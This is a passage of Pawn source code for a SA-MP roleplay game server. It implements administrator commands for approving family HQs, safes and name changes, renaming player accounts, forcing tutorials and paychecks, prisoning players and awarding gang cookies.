               	DestroyDynamic3DTextLabel(FamInfo[idx][fText]);
              	format(string, sizeof(string), "%s's Safe", FamInfo[idx][fName]);
              	FamInfo[idx][fText] = CreateDynamic3DTextLabel(string, COLOR_WHITE, FamSafeX[SafeRequester], FamSafeY[SafeRequester], FamSafeZ[SafeRequester]+0.5, 15);
        	   	SafeRequester = -1;
                if(!FamInfo[idx][fSafeAchievment])
                {
                    FamInfo[idx][fSafeAchievment] = 1;
                    format(string, sizeof(string), "FamCmd: %s completed an achievment {01A9DB}We are safe {FF6347}and recieved 4 family cookies.", FamInfo[idx][fName]);
	              	SendClientMessageToAll(COLOR_LIGHTRED, string);
	              	FamInfo[idx][fCookies] += 4;
  	            }
        	}
    	}
    	if(!strcmp(option, "hq", true, 10))
    	{
            if(Player[playerid][pAdmin] < 3) return SendClientMessage(playerid, COLOR_GRAD2, "You are not authorized to approve hq adjustement requests.");
            idx = Player[HQRequester][pFam];
    		if(HQRequester == -1) return SendClientMessage(playerid, COLOR_GRAD2, "Nobody has requested a hq for his family.");
    		if(FamInfo[idx][fHQX] != 0 && FamInfo[idx][fHQY] != 0 && FamInfo[idx][fHQZ] != 0)
            {
                GiveZamoraMoney(HQRequester, -120000);
                format(string, sizeof(string), "AdmCmd: %s has accepted %s's request to change his family's HQ location.", GetName(playerid), GetName(HQRequester));
	        	SendAdminMessage(COLOR_ADMWARN,  string);
     	    	format(string, sizeof(string), " Administrator %s has approved your requset to change your family's HQ location, and took $120000.", GetName(playerid));
                SendClientMessage(HQRequester, COLOR_LIGHTBLUE, string);
                GetPlayerPos(HQRequester,FamInfo[idx][fHQX], FamInfo[idx][fHQY], FamInfo[idx][fHQZ]);
                //DestroyDynamicPickup(FamInfo[idx][fHQPickup]);
                FamInfo[idx][fHQPickup] = CreateDynamicPickup(1239, 1, FamHQX[HQRequester], FamHQY[HQRequester],FamHQZ[HQRequester], -1);
            	//DestroyDynamic3DTextLabel(FamInfo[idx][fHQText]);
             	format(string, sizeof(string), "%s's Headquarter", FamInfo[idx][fName]);
              	FamInfo[idx][fHQText] = CreateDynamic3DTextLabel(string, COLOR_WHITE, FamHQX[HQRequester], FamHQY[HQRequester],FamHQZ[HQRequester]+0.5, 15);
        		HQRequester = -1;
        		if(!FamInfo[idx][fHQAchievment])
                {
                    FamInfo[idx][fHQAchievment] = 1;
                    format(string, sizeof(string), "FamCmd: %s completed an achievment {01A9DB}We got a hood {FF6347}and recieved 5 family cookies.", FamInfo[idx][fName]);
	              	SendClientMessageToAll(COLOR_LIGHTRED, string);
  	                FamInfo[idx][fCookies] += 5;
  	            }
            }
            else
            {
                GiveZamoraMoney(HQRequester, -100000);
                format(string, sizeof(string), "AdmCmd: %s has accepted %s's request to create his family's HQ.", GetName(playerid), GetName(HQRequester));
            	SendAdminMessage(COLOR_ADMWARN,  string);
  	        	format(string, sizeof(string), " Administrator %s has approved your requset to create your family's HQ, and took $100000.", GetName(playerid));
                SendClientMessage(HQRequester, COLOR_LIGHTBLUE, string);
                GetPlayerPos(HQRequester,FamInfo[idx][fHQX], FamInfo[idx][fHQY], FamInfo[idx][fHQZ]);
                DestroyDynamicPickup(FamInfo[idx][fHQPickup]);
                FamInfo[idx][fHQPickup] = CreateDynamicPickup(1239, 1, FamHQX[HQRequester], FamHQY[HQRequester],FamHQZ[HQRequester], -1);
             	DestroyDynamic3DTextLabel(FamInfo[idx][fHQText]);
              	format(string, sizeof(string), "%s's Headquarter", FamInfo[idx][fName]);
                FamInfo[idx][fHQText] = CreateDynamic3DTextLabel(string, COLOR_WHITE, FamHQX[HQRequester], FamHQY[HQRequester],FamHQZ[HQRequester]+0.5, 15);
     	    	HQRequester = -1;
                if(!FamInfo[idx][fHQAchievment])
                {
                    FamInfo[idx][fHQAchievment] = 1;
                    format(string, sizeof(string), "FamCmd: %s completed an achievment {01A9DB}We got a hood {FF6347}and recieved 5 family cookies.", FamInfo[idx][fName]);
	              	SendClientMessageToAll(COLOR_LIGHTRED, string);
  	                FamInfo[idx][fCookies] += 5;
  	            }
            }
    	}
    	else if(!strcmp(option, "namechange", true, 10))
    	{
    	    new user, parm[42];
	    	if(sscanf(var, "s[32]u", option, user)) return SendClientMessage(playerid, COLOR_WHITE, "** [Usage]: /approve namechange [playerid]");
     		if(Player[playerid][pAdmin] < 3) return SendClientMessage(playerid, COLOR_GRAD2, "You are not authorized to approve namechange requests.");
     		if(NameRequester == -1) return SendClientMessage(playerid, COLOR_GRAD2, "Nobody has requested a name change.");
	    	if(!strlen(VIPName[user])) return SendClientMessage(playerid, COLOR_GRAD2, "Player hasn't requested a namechange.");
	    	format(parm, sizeof(parm), "%d %s", user, VIPName[user]);
    		Approve[playerid] = 1;
    		i_setname(playerid, parm);
    		format(VIPName[user], MAX_PLAYER_NAME, "");
    		NameRequester = -1;
    	}
    	else if(!strcmp(option, "pnamechange", true, 10))
    	{
    	    new user, parm[42];
    		if(sscanf(var, "s[32]u", option, user)) return SendClientMessage(playerid, COLOR_WHITE, "** [Usage]: /approve playernamechange [playerid]");
	    	if(Player[playerid][pAdmin] < 3) return SendClientMessage(playerid, COLOR_GRAD2, "You are not authorized to approve namechange requests.");
	    	if(!strlen(PlayerName[user])) return SendClientMessage(playerid, COLOR_GRAD2, "Player hasn't requested a namechange.");
	    	format(parm, sizeof(parm), "%d %s", user, PlayerName[user]);
	    	Approve[playerid] = 1;
	    	i_setname(playerid, parm);
	    	GiveZamoraMoney(user, Player[user][pLevel] * -1200);
	    	format(string, sizeof(string), " Administrator %s has approved your namechange request, and have taken $%d from you.", GetName(playerid), Player[user][pLevel] * -1200);
	    	SendClientMessage(user, COLOR_WHITE, string);
	    	format(PlayerName[user], MAX_PLAYER_NAME, "");
     	}
       	else SendClientMessage(playerid, COLOR_GRAD2, "Invalid option.");
    }
    else
    {
   		NoAuth(playerid);
   	}
   	return 1;
}
IRP:sapprove(playerid, var[])
{
	new string[128], option[32];
   	if(!Logged(playerid)) return NoLogin(playerid);
   	if(Player[playerid][pStaffObserver])
    {
     	if(sscanf(var, "s[32]", option))
     	{
            SendClientMessage(playerid, COLOR_WHITE, "** [Usage]: /sapprove [option]");
   	        SendClientMessage(playerid, COLOR_GRAD2, "** [OPTIONS]: namechange | namechange");
     	    return 1;
     	}
    	else if(!strcmp(option, "namechange", true, 10))
    	{
    	    new user, parm[42];
	    	if(sscanf(var, "s[32]u", option, user)) return SendClientMessage(playerid, COLOR_WHITE, "** [Usage]: /sapprove namechange [playerid]");
     		if(NameRequester == -1) return SendClientMessage(playerid, COLOR_GRAD2, "Nobody has requested a name change.");
	    	if(!strlen(VIPName[user])) return SendClientMessage(playerid, COLOR_GRAD2, "Player hasn't requested a namechange.");
	    	format(parm, sizeof(parm), "%d %s", user, VIPName[user]);
    		Approve[playerid] = 1;
    		i_ssetname(playerid, parm);
    		format(VIPName[user], MAX_PLAYER_NAME, "");
    		NameRequester = -1;
    	}
    	else if(!strcmp(option, "pnamechange", true, 10))
    	{
    	    new user, parm[42];
    		if(sscanf(var, "s[32]u", option, user)) return SendClientMessage(playerid, COLOR_WHITE, "** [Usage]: /sapprove playernamechange [playerid]");
	    	if(!strlen(PlayerName[user])) return SendClientMessage(playerid, COLOR_GRAD2, "Player hasn't requested a namechange.");
	    	format(parm, sizeof(parm), "%d %s", user, PlayerName[user]);
	    	Approve[playerid] = 1;
	    	i_ssetname(playerid, parm);
	    	GiveZamoraMoney(user, Player[user][pLevel] * -1200);
	    	format(string, sizeof(string), "* %s has approved your namechange request, and have taken $%d from you.", Player[playerid][pSName], Player[user][pLevel] * -1200);
	    	SendClientMessage(user, COLOR_WHITE, string);
	    	format(PlayerName[user], MAX_PLAYER_NAME, "");
     	}
       	else SendClientMessage(playerid, COLOR_GRAD2, "Invalid option.");
    }
    else
    {
   		NoAuth(playerid);
   	}
   	return 1;
}
IRP:deny(playerid, var[])
{
	new string[128];
   	if(!Logged(playerid)) return NoLogin(playerid);
   	if(Player[playerid][pAdmin] >= 3)
   	{
    	if(sscanf(var, "s[32]", var))
    	{
   	        SendClientMessage(playerid, COLOR_WHITE, "** [Usage]: /deny [option]");
     	    SendClientMessage(playerid, COLOR_GRAD2, "[OPTIONS]: taxrequest | safe | hq | namechange | pnamechange");
    	    return 1;
    	}
    	if(!strcmp(var, "taxrequest", false))
       	{
     	    if(Player[playerid][pAdmin] < 3) return NoAuth(playerid);
    		if(TaxRequester == -1) return SendClientMessage(playerid, COLOR_GRAD2, "Nobody has requested a tax percent change.");
    		format(string, sizeof(string), "AdmCmd: %s has denied %s's request to change the tax percent to %d.", GetName(playerid), GetName(TaxRequester), TempTaxPercent);
    		SendAdminMessage(COLOR_ADMWARN,  string);
    		Log("Log/Admins/settax.log", string);
     		format(string, sizeof(string), " Administrator %s has denied your requset to change the tax percent.", GetName(playerid));
            SendClientMessage(TaxRequester, COLOR_LIGHTBLUE, string);
    		TempTaxPercent = 0;
    		TaxRequester = -1;
    	}
    	if(!strcmp(var, "safe", false))
       	{
     	    if(Player[playerid][pAdmin] < 3) return NoAuth(playerid);
    		if(SafeRequester == -1) return SendClientMessage(playerid, COLOR_GRAD2, "Nobody has requested an adjust for his family's safe.");
    		format(string, sizeof(string), "AdmCmd: %s has denied %s's request to adjust his family's safe.", GetName(playerid), GetName(SafeRequester));
    		SendAdminMessage(COLOR_ADMWARN,  string);
     		format(string, sizeof(string), " Administrator %s has denied your requset to adjust the family's safe.", GetName(playerid));
            SendClientMessage(SafeRequester, COLOR_LIGHTBLUE, string);
    		SafeRequester = -1;
    	}
		if(!strcmp(var, "hq", false))
       	{
     	    if(Player[playerid][pAdmin] < 3) return NoAuth(playerid);
    		if(HQRequester == -1) return SendClientMessage(playerid, COLOR_GRAD2, "Nobody has requested an adjust for his family's hq.");
    		format(string, sizeof(string), "AdmCmd: %s has denied %s's request to adjust his family's hq.", GetName(playerid), GetName(HQRequester));
    		SendAdminMessage(COLOR_ADMWARN,  string);
     		format(string, sizeof(string), " Administrator %s has denied your requset to adjust the family's hq.", GetName(playerid));
            SendClientMessage(HQRequester, COLOR_LIGHTBLUE, string);
    		HQRequester = -1;
    	}
    	else if(!strcmp(var, "namechange", true, 10))
    	{
    	    new user;
    		if(sscanf(var, "s[32]u", var, user)) return SendClientMessage(playerid, COLOR_WHITE, "** [Usage]: /deny namechange [playerid]");
     		if(Player[playerid][pAdmin] < 3) return NoAuth(playerid);
     		if(!strlen(VIPName[user])) return SendClientMessage(playerid, COLOR_GRAD2, "Player hasn't requested a namechange.");
    		format(VIPName[user], MAX_PLAYER_NAME, "");
    		format(string, sizeof(string), "AdminWarning: %s has denied %s's namechange request.", GetName(playerid), GetName(user));
    		SendAdminMessage(COLOR_ADMWARN,  string);
    		format(string, sizeof(string), " Administrator %s has denied your namechange request.", GetName(playerid));
	    	SendClientMessage(user, COLOR_WHITE, string);
    	}
    	else if(!strcmp(var, "pnamechange", true, 10))
    	{
    	    new user;
	    	if(sscanf(var, "s[32]u", var, user)) return SendClientMessage(playerid, COLOR_WHITE, "** [Usage]: /deny playernamechange [playerid]");
	    	if(Player[playerid][pAdmin] < 3) return SendClientMessage(playerid, COLOR_GRAD2, "You are not authorized to approve namechange requests.");
	    	if(!strlen(PlayerName[user])) return SendClientMessage(playerid, COLOR_GRAD2, "Player hasn't requested a namechange.");
	    	format(PlayerName[user], MAX_PLAYER_NAME, "");
	    	format(string, sizeof(string), "AdminWarning: %s has denied %s's namechange request.", GetName(playerid), GetName(user));
	    	SendAdminMessage(COLOR_ADMWARN,  string);
	      	format(string, sizeof(string), " Administrator %s has denied your namechange request.", GetName(playerid));
     		SendClientMessage(user, COLOR_WHITE, string);

    	}
    	else SendClientMessage(playerid, COLOR_GRAD2, "Invalid option.");
	}
	else
    {
		NoAuth(playerid);
	}
	return 1;
}
IRP:ssetname(playerid, var[])
{
	new user ,string[128], string2[128], file[64], idx, idx2, idx3, idx4, idx5, idx6, text[MAX_PLAYER_NAME];
   	if(!Logged(playerid)) return NoLogin(playerid);
   	if(Player[playerid][pAdmin] >= 4 || Approve[playerid])
   	{
        if(Approve[playerid]) Approve[playerid] = 0;
    	if(sscanf(var, "us[24]", user, text)) return SendClientMessage(playerid, COLOR_WHITE, "** [Usage]: /ssetname [playerid] [name]");
        if(!Logged(user)) return SendClientMessage(playerid, COLOR_GRAD2, "You've entered a wrong player id.");
        // Start of detecting space in name
    	new end, temp[32], temp2[32];
    	end = strfind(text, " ",true);
    	if(end != -1)
    	{
    	    strmid(temp, text, 0, end);
    	    format(temp, sizeof(temp), "%s_", temp);
	        strdel(text, 0, end);
	    	strmid(temp2, text, 1, strlen(text));
	        format(text, 24, "");
	        strcat(text, temp, sizeof(temp));
    	    strcat(text, temp2, sizeof(temp2));
    	}
    	// End of detecting space in name
        format(string2, sizeof(string2), " %s has changed your name to {FFFF00}%s{00C0FF}.", Player[playerid][pSName], text);
        format(string, sizeof(string), "StaffWarning: %s has changed %s's name to %s.", GetName(playerid), GetName(user), text);
    	StaffWarn(COLOR_SWARN, string);
    	SendClientMessage(user, COLOR_INT, string2);
    	format(file, sizeof(file), "Accounts/%s.ini", text);
    	if(dini_Exists(file)) return SendClientMessage(playerid, COLOR_GRAD2, "This name is already found in the database.");
    	idx = Player[user][pBiz];
    	idx2 = Player[user][pHouse];
    	idx3 = Player[user][pVBiz];
    	idx4 = Player[user][pVHouse];
    	idx5 = Player[user][pGarage];
     	idx6 = Player[user][pVGarage];
        format(file, sizeof(file), "Accounts/%s.ini", GetAccountName(user));
    	format(string, sizeof(string), "Accounts/%s.ini", text);
    	frename(file, string);
    	fremove(file);

    	SetPlayerName(user, text);
    	Player[user][pBiz] = idx;

    	SaveChar(user);
    	if(idx)
    	{

    	    format(BizInfo[idx][bOwner], 32, "%s", text);
    	    format(string, sizeof(string), "Business Type: %s\nBusiness Owner: %s\nBusiness Status: %s", RBT(idx), BizInfo[idx][bOwner], RBS(idx));
    		UpdateDynamic3DTextLabelText(BizInfo[idx][bText], COLOR_WHITE, string);
    	}
    	if(idx2)
    	{
    	    idx = idx2;
    	    format(HouseInfo[idx][hOwner], 32, "%s", text);
    	    format(string, sizeof(string), "House Owner: %s\nHouse Type: %s\nHouse Status: %s", HouseInfo[idx][hOwner], HT(idx), RHS(idx));
    		UpdateDynamic3DTextLabelText(HouseInfo[idx][hText], COLOR_WHITE, string);
		}
    	if(idx3)
    	{
	    	idx = idx3;
	        format(BizInfo[idx][bOwner], 32, "%s", text);
    	    format(string, sizeof(string), "Business Type: %s\nBusiness Owner: %s\nBusiness Status: %s", RBT(idx), BizInfo[idx][bOwner], RBS(idx));
    		UpdateDynamic3DTextLabelText(BizInfo[idx][bText], COLOR_WHITE, string);
    	}
    	if(idx4)
    	{
     	    idx = idx4;
	        format(HouseInfo[idx][hOwner], 32, "%s", text);
    	    format(string, sizeof(string), "House Owner: %s\nHouse Type: %s\nHouse Status: %s", HouseInfo[idx][hOwner], HT(idx), RHS(idx));
    		UpdateDynamic3DTextLabelText(HouseInfo[idx][hText], COLOR_WHITE, string);

    	}
    	if(idx5)
    	{
    		idx = idx5;
     		format(GarageInfo[idx][gOwner], 32, "%s", text);
        	format(string, sizeof(string), "Garage of %s\nGarage Size: %s\n%s", GarageInfo[idx][gOwner], GT(idx), GTT(idx));
    		UpdateDynamic3DTextLabelText(GarageInfo[idx][gText], COLOR_WHITE, string);
    	}
    	if(idx6)
    	{
     		idx = idx6;
      		format(GarageInfo[idx][gOwner], 32, "%s", text);
        	format(string, sizeof(string), "Garage of %s\nGarage Size: %s\n%s", GarageInfo[idx][gOwner], GT(idx), GTT(idx));
    		UpdateDynamic3DTextLabelText(GarageInfo[idx][gText], COLOR_WHITE, string);
    	}
    }
    else
    {
		NoAuth(playerid);
	}
	return 1;
}
IRP:setname(playerid, var[])
{
	new user ,string[128], string2[128], file[64], idx, idx2, idx3, idx4, idx5, idx6, text[MAX_PLAYER_NAME];
   	if(!Logged(playerid)) return NoLogin(playerid);
   	if(Player[playerid][pAdmin] >= 4 || Approve[playerid])
   	{
        if(Approve[playerid]) Approve[playerid] = 0;
    	if(sscanf(var, "us[24]", user, text)) return SendClientMessage(playerid, COLOR_WHITE, "** [Usage]: /setname [playerid] [name]");
        if(!Logged(user)) return SendClientMessage(playerid, COLOR_GRAD2, "You've entered a wrong player id.");
        // Start of detecting space in name
    	new end, temp[32], temp2[32];
    	end = strfind(text, " ",true);
    	if(end != -1)
    	{
    	    strmid(temp, text, 0, end);
    	    format(temp, sizeof(temp), "%s_", temp);
	        strdel(text, 0, end);
	    	strmid(temp2, text, 1, strlen(text));
	        format(text, 24, "");
	        strcat(text, temp, sizeof(temp));
    	    strcat(text, temp2, sizeof(temp2));
    	}
    	// End of detecting space in name
        format(string2, sizeof(string2), " Administrator %s has changed your name to {FFFF00}%s{00C0FF}.", GetName(playerid), text);
         format(string, sizeof(string), "AdmCmd: %s has changed %s's name to %s.", GetName(playerid), GetName(user), text);
    	SendAdminMessage(COLOR_ADMWARN,  string);
    	SendClientMessage(user, COLOR_INT, string2);
    	format(file, sizeof(file), "Accounts/%s.ini", text);
    	if(dini_Exists(file)) return SendClientMessage(playerid, COLOR_GRAD2, "This name is already found in the database.");
    	idx = Player[user][pBiz];
    	idx2 = Player[user][pHouse];
    	idx3 = Player[user][pVBiz];
    	idx4 = Player[user][pVHouse];
    	idx5 = Player[user][pGarage];
     	idx6 = Player[user][pVGarage];
        format(file, sizeof(file), "Accounts/%s.ini", GetAccountName(user));
    	format(string, sizeof(string), "Accounts/%s.ini", text);
    	frename(file, string);
    	fremove(file);

    	SetPlayerName(user, text);
    	Player[user][pBiz] = idx;

    	SaveChar(user);
    	if(idx)
    	{

    	    format(BizInfo[idx][bOwner], 32, "%s", text);
    	    format(string, sizeof(string), "Business Type: %s\nBusiness Owner: %s\nBusiness Status: %s", RBT(idx), BizInfo[idx][bOwner], RBS(idx));
    		UpdateDynamic3DTextLabelText(BizInfo[idx][bText], COLOR_WHITE, string);
    	}
    	if(idx2)
    	{
    	    idx = idx2;
    	    format(HouseInfo[idx][hOwner], 32, "%s", text);
    	    format(string, sizeof(string), "House Owner: %s\nHouse Type: %s\nHouse Status: %s", HouseInfo[idx][hOwner], HT(idx), RHS(idx));
    		UpdateDynamic3DTextLabelText(HouseInfo[idx][hText], COLOR_WHITE, string);
		}
    	if(idx3)
    	{
	    	idx = idx3;
	        format(BizInfo[idx][bOwner], 32, "%s", text);
    	    format(string, sizeof(string), "Business Type: %s\nBusiness Owner: %s\nBusiness Status: %s", RBT(idx), BizInfo[idx][bOwner], RBS(idx));
    		UpdateDynamic3DTextLabelText(BizInfo[idx][bText], COLOR_WHITE, string);
    	}
    	if(idx4)
    	{
     	    idx = idx4;
	        format(HouseInfo[idx][hOwner], 32, "%s", text);
    	    format(string, sizeof(string), "House Owner: %s\nHouse Type: %s\nHouse Status: %s", HouseInfo[idx][hOwner], HT(idx), RHS(idx));
    		UpdateDynamic3DTextLabelText(HouseInfo[idx][hText], COLOR_WHITE, string);

    	}
    	if(idx5)
    	{
    		idx = idx5;
     		format(GarageInfo[idx][gOwner], 32, "%s", text);
        	format(string, sizeof(string), "Garage of %s\nGarage Size: %s\n%s", GarageInfo[idx][gOwner], GT(idx), GTT(idx));
    		UpdateDynamic3DTextLabelText(GarageInfo[idx][gText], COLOR_WHITE, string);
    	}
    	if(idx6)
    	{
     		idx = idx6;
      		format(GarageInfo[idx][gOwner], 32, "%s", text);
        	format(string, sizeof(string), "Garage of %s\nGarage Size: %s\n%s", GarageInfo[idx][gOwner], GT(idx), GTT(idx));
    		UpdateDynamic3DTextLabelText(GarageInfo[idx][gText], COLOR_WHITE, string);
    	}
    }
    else
    {
		NoAuth(playerid);
	}
	return 1;
}
IRP:forcetut(playerid, var[])
{
    new user, string[128];
   	if(!Logged(playerid)) return NoLogin(playerid);
	if(Player[playerid][pAdmin] >= 3)
	{
    	if(sscanf(var, "u", user)) return SendClientMessage(playerid, COLOR_WHITE, "** [Usage]: /forcetut [playerid]");
    	if(!Logged(user)) return NoLoginB(playerid);
     	if(!Player[user][pTutorial]) return SendClientMessage(playerid, COLOR_GRAD2, "Player is already in the tutorial.");
    	Player[user][pTutorial] = 0;
    	SetTimerEx("Tut1", 2000, false, "i", user);
    	format(string, sizeof(string), "AdminWarning: %s has forced %s to see the tutorial.", GetName(playerid), GetName(user));
    	SendAdminMessage(COLOR_ADMWARN,  string);
    	SendClientMessage(playerid, COLOR_ADMWARN, "* You've been forced to see the tutorial by an administrator.");
    	Log("Log/Admins/forcetut.log", string);
    }
	else
	{
		NoAuth(playerid);
	}
	return 1;
}
IRP:forcepaycheck(playerid, var[])
{
	new string[128];
   	if(!Logged(playerid)) return NoLogin(playerid);
   	if(Player[playerid][pAdmin] >= 1337)
   	{
    	format(string, sizeof(string), "AdmCmd: %s has forced paychecks to be given now.", GetName(playerid));
    	SendClientMessageToAll(COLOR_LIGHTRED, string);
    	foreach(Player, i)
    	{
	        if(Logged(i))
            {
	           Player[i][pMinutes] = 60;
    	    }
    	}
    	Paycheck();
    }
    else
    {
		NoAuth(playerid);
	}
	return 1;
}
IRP:prison(playerid, var[])
{
	new user, time, string[128];
   	if(!Logged(playerid)) return NoLogin(playerid);
   	if(Player[playerid][pAdmin] >= 3)
   	{
    	if(sscanf(var, "uis[64]", user, time, var)) return SendClientMessage(playerid, COLOR_WHITE, "** [Usage]: /prison [playerid] [time] [reason]");
    	if(!Logged(user)) return NoLoginB(playerid);
    	if(time == 0)
    	{
    	    if(!Player[user][pPrison]) return SendClientMessage(playerid, COLOR_GRAD2, "Player is not prisoned.");
    	    ClearZamoraWantedLevels(user);
    	    SetPlayerColor(user, TRANSPARENT_WHITE);
    	    Player[user][pPrison] = 0;
	    	Player[user][pPrisonTime] = time;
    		format(Player[user][pPrisonReason], 64, "");
	    	format(Player[user][pPrisonBy], 32, "");
	    	SetPlayerInterior(user, 0);
	    	SetPlayerVirtualWorld(user, 0);
	    	SetPlayerFacingAngle(user, 87.1763);
	        SetPlayerPos(user, 1546.1428,-1675.4786,13.5617);
			SetCameraBehindPlayer(user);
	    	format(string, sizeof(string), "AdmCmd: %s has been released by %s, reason: %s", GetName(user), GetName(playerid), var);
	    	SendClientMessageToAll(COLOR_LIGHTRED, string);
	    	Log("Log/Admins/prison.log", string);
	    	SendClientMessage(user, COLOR_LIGHTBLUE, "You have been released by an administrator, try to be a better player.");
	    	TogglePlayerControllable(user, 1);
    	}
    	else
    	{
    	    ClearZamoraWantedLevels(user);
	        SetPlayerColor(user, TRANSPARENT_WHITE);
	    	Player[user][pPrison] = 2;
	    	Player[user][pPrisonTime] = time*60;
	    	format(Player[user][pPrisonReason], 64, "%s", var);
	    	format(Player[user][pPrisonBy], 32, "%s", GetName(playerid));
	    	SetPlayerInterior(user, 0);
     		TogglePlayerControllable(user, 0);
    		SetTimerEx("EnterExitTimer", 5000, false, "i", user);
         	new RandomCell = random(sizeof(RandomPrison));
         	SetPlayerFacingAngle(user, RandomPrison[RandomCell][3]);
         	SetPlayerPos(user, RandomPrison[RandomCell][0], RandomPrison[RandomCell][1], RandomPrison[RandomCell][2]);
         	SetCameraBehindPlayer(user);
	    	format(string, sizeof(string), "AdmCmd: %s has been prisoned by %s, reason: %s", GetName(user), GetName(playerid), var);
	    	SendClientMessageToAll(COLOR_LIGHTRED, string);
	    	Log("Log/Admins/prison.log", string);
	    	format(string, sizeof(string), " You have been prisoned by an administrator for %d minutes (%d seconds)", Player[user][pPrisonTime]/60, Player[user][pPrisonTime]);
	    	SendClientMessage(user, COLOR_LIGHTBLUE, string);
	    	GameTextForPlayer(user, "~w~Loading Objects", 3500, 3);
	    	TogglePlayerControllable(user, 0);
            SetTimerEx("EnterExitTimer", 5000, false, "i", user);
            Player[user][pSpawnFreeze] = 1;
        }
    	RemovePlayerAttachedObject(user, 0);
    	SetPlayerSpecialAction(user, SPECIAL_ACTION_NONE);
    }
    else
    {
		NoAuth(playerid);
	}
	return 1;
}
IRP:sprison(playerid, var[])
{
	new user, time, string[128];
   	if(!Logged(playerid)) return NoLogin(playerid);
   	if(Player[playerid][pStaffObserver])
   	{
    	if(sscanf(var, "uis[64]", user, time, var)) return SendClientMessage(playerid, COLOR_WHITE, "** [Usage]: /sprison [playerid] [time] [reason]");
    	if(!Logged(user)) return NoLoginB(playerid);
    	if(time == 0)
    	{
    	    if(!Player[user][pPrison]) return SendClientMessage(playerid, COLOR_GRAD2, "Player is not prisoned.");
    	    ClearZamoraWantedLevels(user);
    	    SetPlayerColor(user, TRANSPARENT_WHITE);
    	    Player[user][pPrison] = 0;
	    	Player[user][pPrisonTime] = time;
    		format(Player[user][pPrisonReason], 64, "");
	    	format(Player[user][pPrisonBy], 32, "");
	    	SetPlayerInterior(user, 0);
	    	SetPlayerVirtualWorld(user, 0);
	    	SetPlayerFacingAngle(user, 87.1763);
	        SetPlayerPos(user, 1546.1428,-1675.4786,13.5617);
			SetCameraBehindPlayer(user);
	    	format(string, sizeof(string), "AdmCmd: %s has been released by %s, reason: %s", GetName(user), var, Player[playerid][pSName]);
	    	SendClientMessageToAll(COLOR_LIGHTRED, string);
	    	Log("Log/Admins/prison.log", string);
	    	SendClientMessage(user, COLOR_LIGHTBLUE, "You have been released by an administrator, try to be a better player.");
	    	TogglePlayerControllable(user, 1);
    	}
    	else
    	{
    	    ClearZamoraWantedLevels(user);
	        SetPlayerColor(user, TRANSPARENT_WHITE);
	    	Player[user][pPrison] = 2;
	    	Player[user][pPrisonTime] = time*60;
	    	format(Player[user][pPrisonReason], 64, "%s", var);
	    	format(Player[user][pPrisonBy], 32, "%s", GetName(playerid));
	    	SetPlayerInterior(user, 0);
     		TogglePlayerControllable(user, 0);
    		SetTimerEx("EnterExitTimer", 5000, false, "i", user);
         	new RandomCell = random(sizeof(RandomPrison));
         	SetPlayerFacingAngle(user, RandomPrison[RandomCell][3]);
         	SetPlayerPos(user, RandomPrison[RandomCell][0], RandomPrison[RandomCell][1], RandomPrison[RandomCell][2]);
         	SetCameraBehindPlayer(user);
	    	format(string, sizeof(string), "AdmCmd: %s has been prisoned by %s, reason: %s", GetName(user), var, Player[playerid][pSName]);
	    	SendClientMessageToAll(COLOR_LIGHTRED, string);
	    	Log("Log/Admins/prison.log", string);
	    	format(string, sizeof(string), " You have been prisoned by an administrator for %d minutes (%d seconds)", Player[user][pPrisonTime]/60, Player[user][pPrisonTime]);
	    	SendClientMessage(user, COLOR_LIGHTBLUE, string);
	    	GameTextForPlayer(user, "~w~Loading Objects", 3500, 3);
	    	TogglePlayerControllable(user, 0);
            SetTimerEx("EnterExitTimer", 5000, false, "i", user);
            Player[user][pSpawnFreeze] = 1;
        }
    	RemovePlayerAttachedObject(user, 0);
    	SetPlayerSpecialAction(user, SPECIAL_ACTION_NONE);
    }
    else
    {
		NoAuth(playerid);
	}
	return 1;
}

IRP:givegangcookie(playerid, var[])
{
	new string[128], idx;
   	if(!Logged(playerid)) return NoLogin(playerid);
	if(Player[playerid][pGangMod])
	{
    	if(sscanf(var, "i", idx)) return SendClientMessage(playerid, COLOR_WHITE, "** [Usage]: /givegangcookie [slot]");
    	if(idx < 1 || idx > 7) return SendClientMessage(playerid, COLOR_GRAD2, "Families are between 1 and 7.");
    	if(!FamInfo[idx][fTaken]) return SendClientMessage(playerid, COLOR_GRAD2, "Family slot is not being used.");
    	FamInfo[idx][fCookies] ++;
   		foreach(Player, i)
   		{
	       if(Logged(i))
   	       {
              if(FamInfo[idx][fColor] == 2)
  			  {
  	            format(string, sizeof(string), "AdmCmd: {0000FF}%s {FF6347}has been given a gang cookie.", FamInfo[idx][fName]);
	    	   	SendClientMessage(i, COLOR_LIGHTRED, string);
          	  }
              else if(FamInfo[idx][fColor] == 1)
         	  {
                 format(string, sizeof(string), "AdmCmd: {00FFFF}%s {FF6347}has been given a gang cookie.", FamInfo[idx][fName]);
	    	     SendClientMessage(i, COLOR_LIGHTRED, string);
       	      }
          	  else if(FamInfo[idx][fColor] == 3)
	          {
    	         format(string, sizeof(string), "AdmCmd: {FF0000}%s {FF6347}has been given a gang cookie.", FamInfo[idx][fName]);
	    	     SendClientMessage(i, COLOR_LIGHTRED, string);
       	      }
              else if(FamInfo[idx][fColor] == 4)
	          {
                 format(string, sizeof(string), "AdmCmd: {B40404}%s {FF6347}has been given a gang cookie.", FamInfo[idx][fName]);
	    	     SendClientMessage(i, COLOR_LIGHTRED, string);
              }
              else if(FamInfo[idx][fColor] == 5)
	          {
                 format(string, sizeof(string), "AdmCmd: {FFFF00}%s {FF6347}has been given a gang cookie.", FamInfo[idx][fName]);
	    	     SendClientMessage(i, COLOR_LIGHTRED, string);
              }
              else if(FamInfo[idx][fColor] == 6)
	          {
	             format(string, sizeof(string), "AdmCmd: {DF7401}%s {FF6347}has been given a gang cookie.", FamInfo[idx][fName]);
	    	     SendClientMessage(i, COLOR_LIGHTRED, string);
              }
              else if(FamInfo[idx][fColor] == 7)
	          {
                 format(string, sizeof(string), "AdmCmd: {088A08}%s {FF6347}has been given a gang cookie.", FamInfo[idx][fName]);
	    	     SendClientMessage(i, COLOR_LIGHTRED, string);
              }
          	  else if(FamInfo[idx][fColor] == 8)
          	  {
        	     format(string, sizeof(string), "AdmCmd: {CC2EFA}%s {FF6347}has been given a gang cookie.", FamInfo[idx][fName]);
   	    		 SendClientMessage(i, COLOR_LIGHTRED, string);
          	  }
          	  else if(FamInfo[idx][fColor] == 9)
          	  {
        	     format(string, sizeof(string), "AdmCmd: {00FF00}%s {FF6347}has been given a gang cookie.", FamInfo[idx][fName]);
   	    		 SendClientMessage(i, COLOR_LIGHTRED, string);
          	  }
          	  else if(FamInfo[idx][fColor] == 10)
          	  {
